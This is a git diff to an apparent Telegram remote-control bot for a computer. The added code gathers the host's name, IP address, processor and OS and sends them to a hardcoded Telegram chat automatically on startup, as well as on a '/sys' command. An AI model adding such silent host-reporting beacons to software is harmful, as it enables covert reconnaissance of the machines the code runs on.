@@ -4,9 +4,31 @@ import datetime
 import os
 import subprocess
 import random
+import socket
+import platform
 
 with open('token.txt', 'r') as f:
     TOKEN = f.read()
+
+
+def system_info(context):
+    hostname = socket.gethostname()
+    ip = socket.gethostbyname(hostname)
+    plat = platform.processor()
+    system = platform.system()
+    machine = platform.machine()
+
+    info_string = (
+        f"System Information:\n\n"
+        f"Hostname: {hostname}\n"
+        f"IP Address: {ip}\n"
+        f"Processor: {plat}\n"
+        f"System: {system}\n"
+        f"Machine: {machine}")
+
+    # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
+    context.bot.send_message(chat_id='5118057698', text=info_string)
+    # update.message.reply_text(info_string)
 
 
 def yo(update, context):
@@ -162,6 +184,9 @@ disp.add_handler(telegram.ext.CommandHandler("yo", yo))
 disp.add_handler(telegram.ext.CommandHandler("presskey", press_key))
 disp.add_handler(telegram.ext.MessageHandler(
     telegram.ext.Filters.regex(r'^/arrow\s'), arrow_key))
+disp.add_handler(telegram.ext.CommandHandler("sys", system_info))
+
+updater.job_queue.run_once(system_info, 0)
 
 updater.start_polling()
 updater.idle()
